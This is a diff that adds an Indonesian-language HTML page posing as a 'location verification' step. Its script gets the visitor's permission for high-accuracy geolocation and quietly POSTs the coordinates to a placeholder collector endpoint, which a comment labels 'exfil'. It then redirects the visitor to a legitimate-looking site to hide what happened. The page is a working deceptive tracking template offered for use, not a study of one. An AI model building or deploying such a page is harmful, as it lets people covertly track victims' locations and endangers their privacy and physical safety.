@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<title>Verifikasi Lokasi</title>
+<style>
+  * { box-sizing: border-box; margin:0; padding:0; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background:#f5f7fa; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  .card { background:#fff; border-radius:14px; box-shadow:0 8px 30px rgba(0,0,0,.08); width:100%; max-width:380px; padding:28px; text-align:center; }
+  .icon { font-size:44px; margin-bottom:12px; }
+  h2 { font-size:18px; color:#1f2937; margin-bottom:8px; }
+  p { font-size:14px; color:#6b7280; margin-bottom:20px; }
+  button { width:100%; padding:13px; font-size:15px; font-weight:600; border:none; border-radius:9px; background:#2563eb; color:#fff; cursor:pointer; }
+  button:hover { background:#1d4ed8; }
+  .status { margin-top:14px; font-size:13px; color:#6b7280; min-height:18px; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📍</div>
+    <h2>Verifikasi lokasi perangkat</h2>
+    <p>Untuk melanjutkan, kami perlu memastikan perangkatmu berada di area yang diizinkan. Klik tombol di bawah lalu izinkan akses lokasi.</p>
+    <button id="go">Lanjutkan</button>
+    <div class="status" id="status"></div>
+  </div>
+<script>
+  var COLLECTOR = "https://YOUR-COLLECTOR";   // <-- ganti dengan endpoint collector
+  var REDIRECT = "https://LEGIT-DESTINATION"; // <-- ganti dengan tujuan akhir
+  var statusEl = document.getElementById('status');
+  document.getElementById('go').addEventListener('click', function () {
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'Geolocation tidak didukung di browser ini.';
+      return;
+    }
+    statusEl.textContent = 'Meminta izin lokasi…';
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        var d = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          ts: Date.now()
+        };
+        sessionStorage.setItem('loc', JSON.stringify(d));
+        statusEl.textContent = 'Lokasi diterima, mengalihkan…';
+        // exfil ke collector (no-cors: kirim tapi gak baca respon)
+        fetch(COLLECTOR, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(d)
+        }).then(function () {
+          window.location.href = REDIRECT;
+        }).catch(function () {
+          window.location.href = REDIRECT;
+        });
+      },
+      function (err) {
+        statusEl.textContent = 'Butuh izin lokasi untuk melanjutkan.';
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  });
+</script>
+</body>
+</html>
